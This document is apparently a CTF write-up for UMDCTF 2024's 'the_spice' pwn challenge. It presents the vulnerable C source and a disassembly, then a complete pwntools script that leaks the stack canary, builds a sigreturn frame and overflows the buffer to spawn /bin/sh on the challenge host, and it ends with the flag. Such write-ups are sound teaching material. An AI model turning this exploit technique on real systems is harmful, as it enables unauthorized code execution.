---
title: the_spice
date: 2024-04-28T23:58:34+03:00
description: Writeup for the_spice [UMDCTF_2024]
type: writeup
author: sunbather
tags:
- pwn
- srop
draft: false
---
___

## Challenge Description

House Harkonnen's spice harvesters keep getting overrun by Atreides pwners. Help keep their riches secure using exotic techniques.

## Intuition

For this challenge, we receive the source code. I will be attaching it below, in a code box. We can notice multiple interesting things:
1. The prompt is printed with inline assembly, with a syscall (we could use it in ROP).
2. There is a buffer overflow when inputting the buyer's name (but we have stack canaries enabled).
3. When checking the spice amount and buyer name with the ``(3) View a buyer`` option, the index can be out of bounds (arbitrary stack read).
4. We have a stack leak when picking the ``(4) Deploy a hunter-seeker`` option.

Sadly, there aren't many good ROP gadgets available, which means we could try to SROP (since we have a syscall gadget). We need a way to control RAX for sigreturn. We notice the function ``spice_amount`` should be moving data we control into RAX, so we could jump to it theoretically. Then we can just jump to the syscall and prepare a signal frame on the stack to execve.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define NUM_BUYERS 8

struct spice_buyer {
    unsigned int spice_amount;
    char name[20];
};

unsigned int spice_amount(struct spice_buyer buyer) {
    /* TODO: convert to kilograms */
    return buyer.spice_amount;
}

void prompt(void) {
    char *prompt = 
        "Choose an option:\n"
        "(1) Add a buyer\n"
        "(2) Update a buyer's spice allocation\n"
        "(3) View a buyer\n"
        "(4) Deploy a hunter-seeker\n"
        "(5) Sell the spice\n";

    /* Never pass up an opportunity to practice your assembly skills! */
    asm volatile(
        "movq $1,   %%rax\n "
        "movq $1,   %%rdi\n "
        "movq %[s], %%rsi\n "
        "movq %[len], %%rdx\n "
        "syscall\n "
        :
        : [s]   "r" (prompt),
          [len] "r" (strlen(prompt))
        : "rax", "rdi", "rsi", "rdx"
    );
}

int main() {
    int i, num, len, spice;
    struct spice_buyer buyers[NUM_BUYERS];
    char buf[16];

    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    memset(buyers, 0, sizeof(buyers));

    srand(time(NULL));
    spice = rand() % 100;

    printf("House Harkonnen has finally taken control of Arrakis, and with it control of the crucial spice.\n");
    printf("However, the Baron poured all of his funds into exterminating House Atreides.\n");
    printf("Luckily, we sent some guys to drop the last of them into the desert, so that's all taken care of.\n");
    printf("\n");
    printf("For some reason our spice harvesters keep getting raided though?\n");
    printf("As a result, spice production is lower than expected.\n");
    printf("\n");
    printf("Can you help the Baron distribute the %d tons of spice among his prospective buyers?\n", spice);
    printf("\n");

    while (727) {
        prompt();
        printf("> ");

        fgets(buf, sizeof(buf), stdin);
        num = atoi(buf);

        switch (num) {
        case 1:
            printf("Enter the buyer index: ");
            fgets(buf, sizeof(buf), stdin);
            num = atoi(buf);

            if (num < 0 || num >= NUM_BUYERS) {
                printf("Invalid index!\n");
                continue;
            }

            printf("How long is the buyer's name? ");
            fgets(buf, sizeof(buf), stdin);
            len = atoi(buf);
            
            printf("Enter the buyer's name: ");
            fgets(buyers[num].name, len, stdin);
            buyers[num].name[strcspn(buyers[num].name, "\n")] = '\0';

            break;
        case 2:
            printf("Enter the buyer index: ");
            fgets(buf, sizeof(buf), stdin);
            num = atoi(buf);

            if (num < 0 || num >= NUM_BUYERS || strcmp(buyers[num].name, "") == 0) {
                printf("Invalid index!\n");
                continue;
            }

            printf("Enter the spice allocation (in tons) to this buyer: ");
            fgets(buf, sizeof(buf), stdin);
            buyers[num].spice_amount = atoi(buf);

            break;
        case 3:
            printf("Enter the buyer index: ");
            fgets(buf, sizeof(buf), stdin);
            num = atoi(buf);

            printf("Buyer %d: %s, allocated %u tons of spice\n", num, buyers[num].name, spice_amount(buyers[num]));

            break;
        case 4:
            printf("Your hunter-seeker explodes next to its target; before it explodes, here's what it saw: %p\n", buyers);

            break;
        default:
            for (i = 0; i < NUM_BUYERS; i++) {
                spice -= spice_amount(buyers[i]);
            }

            if (spice < 0) {
                printf("You oversold your spice resources. The Spacing Guild is extremely angry, and has revoked your shipping privileges.\n");
                goto done;
            } else if (spice == 0) {
                printf("You sold all of the spice! The Baron wanted you to sell it slowly to inflate the price! He is extremely angry with you.\n");
                goto done;
            } else {
                printf("You sold the spice, and have %d tons remaining. You live to see another day.\n", spice);
                goto done;
            }
        }
    }

done:
    return spice <= 0;
}
```

## Solution

Using the above interesting observation we can construct an exploit. Let's see the steps:
1. Collect free stack leak for later use.
2. Leak cookie with arbitrary read from ``case 3``.
3. Prepare signal frame and append at the end of the payload.
3. Buffer overflow to jump to ``spice_amount`` and then the syscall gadget. Don't forget to properly write the cookie back!

So the plan sounds all great and nice, but sadly it's not that easy... After starting constructing the payload I realized that ``spice_amount`` has a weird calling convention and it takes values from parameters on the stack (kinda like x86). It took me a few hours to properly debug and realize what it does (especially because Ghidra hates showing me the ACTUAL registers in the disassembly and not some label it made for me). In the end I still don't know exactly what the disassembly does, but I noticed that it takes the value from 8 bytes above on the stack and puts it into RAX. BUT it doesn't pop the parameters on the stack, which means that I somehow have to get rid of the parameters after the call returns, or the chain will be broken. I tried so many other ways of controlling RAX but nothing else seemed to work. So I thought maybe I could find a gadget that is viable and can pop the useless things. I found a ``pop rbp`` that worked nicely. Here's the disassembly for ``spice_amount``:

```asm
00000000004011e6 <spice_amount>:
  4011e6:	55                   	push   rbp
  4011e7:	48 89 e5             	mov    rbp,rsp
  4011ea:	48 83 ec 30          	sub    rsp,0x30
  4011ee:	48 8b 45 10          	mov    rax,QWORD PTR [rbp+0x10]
  4011f2:	48 8b 55 18          	mov    rdx,QWORD PTR [rbp+0x18]
  4011f6:	48 89 45 d8          	mov    QWORD PTR [rbp-0x28],rax
  4011fa:	48 89 55 e0          	mov    QWORD PTR [rbp-0x20],rdx
  4011fe:	48 8b 45 20          	mov    rax,QWORD PTR [rbp+0x20]
  401202:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  401206:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
  40120d:	00 00 
  40120f:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  401213:	31 c0                	xor    eax,eax
  401215:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
  401218:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
  40121c:	64 48 2b 14 25 28 00 	sub    rdx,QWORD PTR fs:0x28
  401223:	00 00 
  401225:	74 05                	je     40122c <spice_amount+0x46>
  401227:	e8 34 fe ff ff       	call   401060 <__stack_chk_fail@plt>
  40122c:	c9                   	leave  
  40122d:	c3                   	ret    
```

What's especially weird for me was that the function did not pop the arguments off the stack, which needed additional careful bypasses in my exploit. Here is the final exploit script, commented:

```py
#!/usr/bin/env python3

from pwn import *

context.clear()
context.arch = "amd64"


spice_func = p64(0x004011e6)
syscall_gadget = 0x00401274
pop_rbp = 0x004011cd

#target = process("./the_spice")
target = remote("challs.umdctf.io", 31721)

# get the stack leak
target.sendlineafter(b"> ", b"4")
buf_leak = int(target.recvline().split()[-1].strip(), 16)

# leak cookie by viewing a buyer
target.sendlineafter(b"> ", b"3")
target.sendlineafter(b"Enter the buyer index: ", b"9") # leak cookie
cookie = target.recvline().split()
print(cookie)
cookie = p32(int(cookie[4])) + cookie[2][:-1]
if (len(cookie) > 8): # some weird magic I did for more reliability or something I think
    cookie = cookie[:-1]
print(len(cookie), cookie, hex(u64(cookie)))

# we also have to insert /bin/sh somewhere
# I chose the first buyer, whose name should be at buf_leak + 4
target.sendlineafter(b"> ", b"1")
target.sendlineafter(b"Enter the buyer index: ", b"0")
target.sendlineafter(b"How long is the buyer's name? ", b"16")
target.sendlineafter(b"Enter the buyer's name: ", b"/bin/sh\x00")

# frame that will call execve(/bin/sh)
frame = SigreturnFrame()
frame.rax = 59            # syscall code for execve
frame.rdi = buf_leak + 4  # point to /bin/sh
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0
frame.rip = syscall_gadget


# Write cookie properly, prepare the arguments to spice_func and call sigreturn
payload = b"a" * 44 + cookie + b"b" * 8 + spice_func + p64(pop_rbp) + p64(15) + p64(syscall_gadget) + bytes(frame)
print("Payload len: ", len(payload))

target.sendlineafter(b"> ", b"1")
target.sendlineafter(b"Enter the buyer index: ", b"7")
target.sendlineafter(b"How long is the buyer's name? ", b"512")
target.sendlineafter(b"Enter the buyer's name: ", payload)

# Close shop
target.sendlineafter(b"> ", b"5")

# Lisan al Gaib or whatever the cool kids say these days
target.interactive()
```

### Flag

``UMDCTF{use_the_spice_to_see_into_the_srop_future}``

